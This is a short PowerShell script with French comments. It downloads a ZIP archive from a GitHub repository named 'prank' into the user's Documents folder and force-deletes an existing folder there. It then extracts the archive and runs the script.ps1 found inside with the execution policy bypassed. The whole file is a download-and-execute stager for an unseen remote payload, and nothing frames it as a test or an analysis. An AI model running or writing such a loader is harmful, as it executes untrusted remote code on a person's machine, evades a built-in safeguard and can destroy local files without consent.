# Obtenir le dossier Documents
$docs = [Environment]::GetFolderPath("MyDocuments")

# Définir les chemins
$zipUrl = "https://github.com/Redwally/prank/raw/refs/heads/main/histoire.zip"
$zipPath = Join-Path $docs "histoire.zip"
$extractPath = Join-Path $docs "histoire"

# Télécharger le fichier ZIP
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath

# S'assurer que le dossier d'extraction existe et est vide
if (Test-Path $extractPath) { Remove-Item $extractPath -Recurse -Force }
New-Item -ItemType Directory -Path $extractPath | Out-Null

# Charger la bibliothèque .NET pour extraire le zip
Add-Type -AssemblyName System.IO.Compression.FileSystem

# Extraire l'archive
[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)

# Rechercher script.ps1
$script = Get-ChildItem -Path $extractPath -Recurse -Filter "script.ps1" | Select-Object -First 1

# Lancer le script s'il est trouvé
if ($script) {
    powershell -ExecutionPolicy Bypass -File $script.FullName
} else {
    Write-Host "script.ps1 introuvable dans l'archive extraite."
}
